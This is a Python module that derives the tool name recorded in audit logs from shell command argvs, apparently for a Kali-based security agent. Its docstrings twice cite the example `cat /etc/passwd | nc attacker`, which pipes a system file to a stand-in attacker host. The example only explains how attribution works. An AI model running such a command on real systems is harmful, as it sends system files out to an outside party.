"""Tool-name derivation and shell-pipeline parsing for kali audit rows.

Pure functions only — no I/O, no side effects. Picks the human-meaningful
tool name from a command argv so the audit row's ``tool_name`` field reflects
the operator-meaningful binary (e.g. attribute ``cat /etc/passwd | nc attacker``
to ``nc``, not ``cat`` or ``sh``). Split out from kali.py so test patches and
future tool-naming heuristics live in one focused module.
"""
from __future__ import annotations

import shlex
from typing import Any


_SHELL_BINARIES = frozenset({"sh", "bash", "dash", "zsh", "/bin/sh", "/bin/bash", "/bin/dash", "/usr/bin/sh", "/usr/bin/bash", "/usr/bin/env"})


_SHELL_KEYWORDS = frozenset({
    "for", "while", "until", "if", "elif", "case", "do", "done", "then", "else",
    "fi", "esac", "in", "select", "function", "time", "{", "}", "(", ")",
    "&&", "||", ";", ";;", "!", "exec",
})


def _is_plausible_executable(token: str) -> bool:
    if not token:
        return False
    # `VAR=value` env prefix.
    if "=" in token and token.split("=", 1)[0].isidentifier():
        return False
    # Shell keyword or operator.
    if token in _SHELL_KEYWORDS:
        return False
    # Trailing semicolons/operators (e.g. `true;`).
    if any(ch in token for ch in (";", "&", "|", "(", ")", "{", "}", "<", ">")):
        return False
    return True


def _scan_inner_for_first_exec(inner: list[str]) -> tuple[str | None, bool]:
    """Walk a parsed shell `-c` argv and return (first_executable, indeterminate).

    ``indeterminate`` is True when the head token is a bash variable
    expansion (e.g. ``$tool``), which means the real binary only resolves at
    runtime and the audit row should flag the ambiguity.
    """
    skip_until_after: str | None = None
    skip_next = False
    iterations_left = 128
    i = 0
    while i < len(inner) and iterations_left > 0:
        iterations_left -= 1
        part = inner[i]
        if skip_next:
            skip_next = False
            i += 1
            continue
        if part in {">", "<", ">>", "<<", "2>", "2>>", "&>", "&>>", "<&", ">&"}:
            skip_next = True
            i += 1
            continue
        if part in {"for", "while", "until"}:
            skip_until_after = "do"
            i += 1
            continue
        if part == "if":
            skip_until_after = "then"
            i += 1
            continue
        if skip_until_after is not None:
            if part == skip_until_after:
                skip_until_after = None
            i += 1
            continue
        if part.startswith("$"):
            return part, True
        if _is_plausible_executable(part):
            return part, False
        i += 1
    return None, False


def _split_inner_pipeline_stages(inner: list[str]) -> list[list[str]]:
    """Split a parsed shell `-c` argv on bare ``|`` tokens. Other operators
    (``&&``/``||``/``;``) are NOT stage boundaries — only `|` triggers the
    pipe-tail attribution rule. Returns the list of stage argvs in order."""
    stages: list[list[str]] = [[]]
    for token in inner:
        if token == "|":
            stages.append([])
            continue
        stages[-1].append(token)
    return [s for s in stages if s]


def _derive_tool_name(cmd: list[str]) -> str:
    """Pick the human-meaningful tool name from a command argv.

    Default: first argv token. Override: when the first token is a shell
    binary and a `-c` argument is present:

    - if the inner command contains a bare ``|`` token, attribute to the
      LAST pipeline stage's executable (so `cat /etc/passwd | nc attacker`
      attributes to ``nc``, matching the operator-meaningful exfil tool);
    - otherwise return the first plausibly-executable token, skipping shell
      keywords, env-var prefixes, redirection operators, and bare loop-
      iteration variables.

    Falls back to the shell binary itself if no plausible executable is
    found inside `-c`.
    """
    name, _meta = _analyze_tool_name(cmd)
    return name


def _analyze_tool_name(cmd: list[str]) -> tuple[str, dict[str, Any]]:
    """Same selection logic as ``_derive_tool_name`` plus a metadata dict
    with ``shell_pipeline_tools`` (every pipe stage's head, in order) and
    ``tool_name_indeterminate`` (True when the chosen head is a bash
    variable expansion that only resolves at runtime).
    """
    if not cmd:
        return "command", {}
    # Keep launcher option knowledge in the execution-policy parser so audit
    # naming, denied-tool enforcement, and OOB safety cannot drift apart.
    from . import scope as scope_lib

    effective = scope_lib._unwrap_launcher_argv(cmd)
    if effective != cmd:
        name, meta = _analyze_tool_name(effective)
        return name, {
            **meta,
            "transparent_launchers": [cmd[0]],
        }
    first = cmd[0]
    if first not in _SHELL_BINARIES:
        return first, {}
    for idx, token in enumerate(cmd[1:-1], start=1):
        if token == "-c":
            try:
                inner = shlex.split(cmd[idx + 1])
            except ValueError:
                return first, {}
            if "|" in inner:
                stages = _split_inner_pipeline_stages(inner)
                heads: list[str] = []
                indeterminate = False
                for stage in stages:
                    head, stage_indeterminate = _scan_inner_for_first_exec(stage)
                    if head is not None:
                        heads.append(head)
                        indeterminate = indeterminate or stage_indeterminate
                if not heads:
                    return first, {}
                meta: dict[str, Any] = {"shell_pipeline_tools": list(heads)}
                if indeterminate:
                    meta["tool_name_indeterminate"] = True
                return heads[-1], meta
            head, indeterminate = _scan_inner_for_first_exec(inner)
            if head is None:
                return first, {}
            meta = {}
            if indeterminate:
                meta["tool_name_indeterminate"] = True
            return head, meta
    return first, {}
